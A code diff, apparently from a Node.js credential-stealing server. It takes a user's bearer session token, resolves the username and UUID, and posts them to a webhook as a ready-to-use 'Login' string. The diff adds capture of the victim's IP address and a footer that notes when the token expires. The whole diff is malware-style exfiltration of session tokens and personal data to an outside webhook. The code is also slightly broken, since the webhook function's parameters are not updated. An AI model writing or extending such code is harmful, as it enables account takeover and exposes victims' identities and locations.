@@ -24,10 +24,11 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        const ip = getIp(req)
         if (checkIfBanned(username)) {
             return
         }
-        postToWebhook(username, bearerToken, uuid)
+        postToWebhook(username, bearerToken, uuid, ip)
     } catch (e) {
         console.log(e)
     }
@@ -116,6 +117,10 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
+function getIp(req) {
+    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
+}
+
 function postToWebhook(username, bearerToken, uuid) {
     const url = webhook_url
     let data = {
@@ -126,10 +131,15 @@ function postToWebhook(username, bearerToken, uuid) {
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
+                {name: "Ip", value: ip, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
             ]
-        }]
+        }],
+        footer: {
+            "text": "Token expr: ${new Date(Date.now() + 86400000).toLocaleString()}",
+            "icon_url": "https://cdn.discordapp.com/attachments/1021436161694105656/1028578410571767869/apple-clock-493151.png"
+        }
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
